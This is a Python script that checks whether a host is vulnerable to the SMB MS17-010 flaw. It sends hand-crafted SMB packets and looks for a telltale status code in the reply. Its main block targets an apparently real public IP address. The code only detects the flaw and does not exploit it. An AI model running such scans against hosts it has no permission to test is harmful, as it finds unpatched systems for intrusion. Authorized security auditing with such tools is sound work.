
import socket
import binascii
import struct

def bin2hex(x):
    return ''.join(['%02x' % b for b in x])

def verify(protocol,ip,port):
    url = ip+':'+str(port)
    port = int(port)
    print('testing if smb ms17-010 vul')
    negotiate_protocol_request = binascii.unhexlify(
        "00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200")
    session_setup_request = binascii.unhexlify(
        "00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(60)
        s.connect((ip, port))
        s.send(negotiate_protocol_request)
        s.recv(1024)
        s.send(session_setup_request)
        data = s.recv(1024)
        user_id = data[32:34]
        asdad = bytes(ip, 'utf-8')
        tree_connect_andx_request = "000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00" % ((58 + len(ip)), bin2hex(user_id),bin2hex(asdad))
        s.send(binascii.unhexlify(tree_connect_andx_request))
        data = s.recv(1024)
        allid = data[28:36]
        payload = "0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00" % bin2hex(allid)
        s.send(binascii.unhexlify(payload))
        data = s.recv(1024)
        s.close()
        if b"\x05\x02\x00\xc0" in data:
            msg = 'There is smb ms17-010 vul on '+url+' .'
            number = 'v44'
            return True,url,number,msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no smb ms17-010 vul'
    number = 'v0'
    return False,url,number,msg

if __name__ == '__main__':
    res = verify('http','180.76.196.110',80)
    print(res)